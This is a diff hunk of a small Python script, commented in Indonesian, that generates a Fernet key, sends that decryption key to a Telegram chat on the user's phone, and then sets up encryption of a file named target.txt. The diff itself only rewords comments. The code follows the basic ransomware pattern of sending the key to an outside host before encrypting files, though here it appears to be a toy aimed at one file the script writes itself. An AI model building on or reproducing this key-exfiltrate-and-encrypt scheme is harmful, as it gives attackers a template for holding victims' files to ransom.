@@ -13,16 +13,16 @@ def kirim_ke_telegram(pesan):
     except:
         print("Koneksi gagal!")
 
-# 1. Generate Kunci & Pesan
+# Generate Kunci & Pesan
 kunci = Fernet.generate_key()
 kunci_teks = kunci.decode()
 
-# 2. Kirim Notifikasi ke HP kamu
+# Kirim Notifikasi ke HP kamu
 kirim_ke_telegram(f"🔓 KUNCI DEKRIPSI DITEMUKAN!\n\nUser: Kurumii-Kali\nKey: {kunci_teks}")
 
-# 3. Proses Enkripsi File
+# Proses Enkripsi File
 cipher = Fernet(kunci)
-# Pastikan file target.txt sudah ada
+# Pastikan file target.txt ada
 with open("target.txt", "w") as f:
     f.write("DOKUMEN RAHASIA NEGARA - JANGAN DIBUKA")
 
